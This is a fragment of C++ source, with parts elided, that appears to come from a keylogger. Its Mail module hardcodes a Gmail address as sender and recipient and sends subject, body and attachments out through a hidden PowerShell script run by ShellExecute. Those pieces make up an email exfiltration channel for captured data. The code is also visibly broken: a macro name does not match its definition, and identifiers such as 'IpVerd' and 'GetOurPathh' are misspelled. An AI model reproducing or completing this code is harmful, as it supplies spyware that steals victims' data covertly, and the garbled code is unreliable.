...
#include "Timer.h"
#include "Helper.h"
#define SCRIPT_NAME "new2.ps1"

namespace Mail
{
    #define X_EM_TO "athaagrak@gmail.com"
    #define X_EM_FROM "athaagrak@gmail.com"
    #define X_EM_PASS "###"
    ...
    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
     {
        ...
        if(!ok)
            return -1;
        std::string scr_path = IO::GetOurPathh(true) + std::string(SCRIPT NAME);
        if(!ok)
            return -2;
        ...
        ShExecInfo.IpVerd = "open";
        ShExecInfo.IpFile = "powershell";
        ShExecInfo.IpParameters = param.c_str();
        ShExecInfo.IpDirectory = NULL;
